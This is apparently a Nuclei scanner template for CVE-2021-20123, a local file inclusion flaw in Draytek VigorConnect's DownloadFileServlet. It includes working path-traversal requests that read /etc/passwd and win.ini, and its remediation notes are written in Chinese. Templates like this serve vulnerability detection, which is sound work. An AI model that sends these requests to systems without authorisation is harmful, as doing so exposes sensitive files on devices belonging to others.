id: CVE-2021-20123
info:
  name: Draytek VigorConnect - Unauthenticated Local File Inclusion DownloadFileServlet
  author:
  - l0ne1y
  description: |-
    Draytek VigorConnect 本地文件包含漏洞
    Draytek VigorConnect 1.6.0-B3中存在一个本地文件包含漏洞，位于 downloadfileservervlet 端点的文件下载功能中。未经身份验证的攻击者可以利用此漏洞从具有根特权的底层操作系统下载任意文件。
  severity: high
  remediation: |
    官方修复建议：
    升级到 Draytek VigorConnect 1.6.1 或更新版本
    https://www.draytek.com/products/vigorconnect/


    临时修复方案：<br/>1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断<br/>2、过滤.（点）/（反斜杠）\\（反斜杠），编码绕过<br/>3、禁止服务器远程文件包含
requests:
- matchers:
  - type: regex
    condition: or
    regex:
    - 'root:.*:0:0:'
    - for 16-bit app support
  - type: word
    part: header
    words:
    - application/octet-stream
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything'
  - '{{BaseURL}}/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything'
  method: GET
  stop-at-first-match: true
